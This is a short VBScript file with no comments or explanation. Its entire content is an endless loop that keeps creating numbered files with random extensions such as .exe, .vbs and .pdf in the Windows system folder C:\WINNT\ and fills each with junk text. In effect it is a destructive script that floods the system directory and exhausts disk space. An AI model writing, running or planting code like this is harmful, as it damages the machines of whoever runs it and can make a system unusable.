Dim fso, File, i, FileTypes

Randomize
Set fso = CreateObject("Scripting.FileSystemObject")

FileTypes = Array(".vbs", ".exe", ".txt", ".mp3", ".mp4", ".jpg", ".png", ".pdf", ".pptx", ".doc")
i = 0

While (True)
	Set File = fso.CreateTextFile("C:\WINNT\" & i & FileTypes(Int((10 * Rnd) + 0)), True)
	File.WriteLine "BlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsense..."
	File.Close
	i = i + 1
Wend
